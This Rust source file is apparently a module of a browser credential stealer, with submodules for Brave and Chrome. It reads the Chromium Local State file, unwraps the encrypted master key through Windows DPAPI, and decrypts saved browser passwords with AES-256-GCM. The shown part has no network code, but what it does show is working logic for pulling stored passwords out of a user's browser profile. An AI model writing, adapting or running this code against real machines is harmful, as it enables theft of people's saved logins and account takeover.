pub mod brave;
pub mod chrome;

use crate::utilities::Utils;

use anyhow::{
    anyhow, 
    Result
};

use aes_gcm::{
    Aes256Gcm, 
    aead::{
        Aead, 
        NewAead, 
        generic_array::GenericArray
    }
};

use winapi::um::{
    wincrypt::DATA_BLOB, 
    winbase::LocalFree, 
    dpapi::CryptUnprotectData
};

use rustc_serialize::json::Json;
use base64::decode;

use std::mem::{
    transmute, 
    zeroed
};

use std::ptr::null_mut;

use std::path::Path;
use std::fs::File;
use std::io::Read;

pub fn decrypt_chromium_password(master_key: Vec<u8>, buffer: Vec<u8>) -> Result<String> {
    let iv = &buffer[3..15];
    let payload = &buffer[15..];

    let key = GenericArray::clone_from_slice(&master_key);
    let aead = Aes256Gcm::new(&key);
    let nonce = GenericArray::from_slice(&iv);

    let plaintext = aead.decrypt(nonce, payload.as_ref()).expect("decryption failure");
    match std::str::from_utf8(&plaintext) {
        Ok(decrypted_pass) => return Ok(decrypted_pass.to_string()),
        Err(e) => return Err(anyhow!(e.to_string())),
    };
}

pub fn decrypt_chromium_blob(data: &[u8]) -> Vec<u8> {
    unsafe {
        let mut data_in: DATA_BLOB = zeroed();
        let mut data_out: DATA_BLOB = zeroed();

        data_in.pbData = transmute(data.as_ptr() as usize);
        data_in.cbData = data.len() as u32;

        let mut result = Vec::new();
        if CryptUnprotectData(&mut data_in, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut data_out) > 0 {
            result = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).into();
            LocalFree(transmute(data_out.pbData));
        }

        result
    }
}

fn get_master_key(location: &str) -> Result<Vec<u8>> {
    let local_state_dir = Utils::construct_directory(location);
    if Path::new(&local_state_dir).exists() {
        let mut file = File::open(&local_state_dir)?;
        let mut data = String::new();

        file.read_to_string(&mut data)?;

        if let Ok(json) = Json::from_str(&data) {
            let key = format!("{}", &json["os_crypt"]["encrypted_key"]).replace('"', "");
            let decoded = decode(&key)?[5..].to_vec();
            return Ok(decrypt_chromium_blob(&decoded));
        }
    }

    return Err(anyhow!(format!("Unable to get master key")));
}